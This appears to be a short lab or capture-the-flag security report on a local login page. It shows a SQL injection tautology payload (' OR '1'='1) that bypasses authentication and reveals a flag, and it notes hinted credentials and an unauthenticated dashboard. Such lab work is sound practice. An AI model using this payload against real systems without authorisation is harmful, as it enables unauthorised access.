### 2. Login endpoint (identified)

**`POST /login`** — form-encoded fields `user` and `pass`:
```html
<form method="POST" action="/login">
<label>user <input name="user"></label>
<label>pass <input name="pass" type="password"></label>
```
The page itself leaks credentials/hints: `Hint: classic SQLi on user field. admin/admin123 if you prefer.`

### 3. SQLi — one benign probe

**Control** (non-injected, establishes baseline): `POST user=notarealuser&pass=wrongpass`
```
HTTP/1.0 401 Unauthorized
<h1>Login failed</h1><p>Invalid credentials</p>
```

**Probe** (single tautology on `user` field): `POST user=' OR '1'='1 & pass=probe`
```
HTTP/1.0 200 OK
<h1>Logged in</h1><p>Welcome ' OR '1'='1</p><p>Flag: FLAG{helmpi_local_lab_ok}</p>
```

### Findings

1. **SQL injection in `user` parameter of `POST /login` — confirmed.** Auth bypass via `' OR '1'='1`; the payload is reflected unescaped in the response (`Welcome ' OR '1'='1`), also indicating reflected output. Evidence: 401 baseline vs 200 + "Logged in" on the probe.
2. **Credential hint disclosed in HTML** (`admin/admin123`) — trivial auth bypass without needing SQLi.
3. **`/dashboard` reachable with no authentication** (200 on a bare GET, no cookie sent).
4. **Catch-all routing** — every unknown path returns `200` index HTML, so scanner-style path enumeration can't distinguish real routes; no `robots.txt`/`sitemap.xml` behavior to read.

Only the single SQLi probe above was sent; no further injection, fuzzing, or data extraction was performed, and all requests targeted `127.0.0.1:18080` exclusively.
